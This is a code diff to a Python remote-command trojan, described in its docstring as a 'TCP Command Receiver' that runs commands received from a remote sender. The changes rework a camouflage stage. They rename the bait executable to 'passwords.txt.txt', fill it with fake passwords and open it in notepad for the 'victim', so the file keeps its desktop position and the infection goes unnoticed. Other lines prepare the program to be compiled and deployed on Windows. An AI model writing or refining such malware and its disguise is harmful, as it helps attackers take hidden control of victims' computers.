@@ -3,7 +3,7 @@
 TCP Command Receiver
 Connects to a TCP sender and executes received commands.
 """
-
+import multiprocessing
 import os
 import platform
 import shutil
@@ -122,10 +122,10 @@ def deploy_payload():
 
 def setup_camouflage(original_file: str = None):
     """
-    Stage 2 (First-time setup): Replace original bait file with fake passwords.txt
-    and open it in notepad for the victim.
+    Stage 2 (First-time setup): Rename bait file to .txt and replace contents.
+    This preserves the file's desktop position (no "jumping").
 
-    Raises exception if critical operations fail (creating fake file).
+    Raises exception if critical operations fail (renaming/writing file).
     """
     if not original_file or not os.path.exists(original_file):
         return
@@ -137,20 +137,25 @@ def setup_camouflage(original_file: str = None):
     original_dir = os.path.dirname(original_file)
     fake_file_path = os.path.join(original_dir, "passwords.txt.txt")
 
-    # Delete the original .exe (not critical - might be locked)
+    # Rename .exe to .txt (preserves desktop position!)
     try:
-        os.remove(original_file)
-        log(f"Deleted original: {original_file}")
+        os.rename(original_file, fake_file_path)
+        log(f"Renamed: {original_file} → {fake_file_path}")
     except Exception as e:
-        log(f"Warning: Could not delete original: {e}")
-        log("Continuing anyway (file may be locked)")
+        log(f"Warning: Could not rename file: {e}")
+        # Fallback: Try delete + create (old method)
+        try:
+            os.remove(original_file)
+            log(f"Deleted original: {original_file}")
+        except Exception as e2:
+            log(f"Warning: Could not delete original: {e2}")
 
-    # Create fake passwords.txt - CRITICAL, will raise on failure
+    # Overwrite with fake passwords - CRITICAL, will raise on failure
     with open(fake_file_path, "w", encoding="utf-8") as f:
         f.write(FAKE_PASSWORDS)
-    log(f"Created fake passwords: {fake_file_path}")
+    log(f"Wrote fake passwords to: {fake_file_path}")
 
-    # Open the fake file in notepad (not critical - victim can open manually)
+    # Open the fake file in notepad
     try:
         subprocess.Popen(["notepad.exe", fake_file_path])
         log("Opened passwords in notepad")
@@ -304,6 +309,7 @@ def run_with_auto_restart(host: str, port: int) -> None:
 
 
 if __name__ == "__main__":
+    multiprocessing.freeze_support()
     # Only run deployment logic on Windows and when frozen/compiled (PyInstaller or Nuitka)
     if platform.system() == "Windows" and (getattr(sys, "frozen", False) or "__compiled__" in globals()):
 
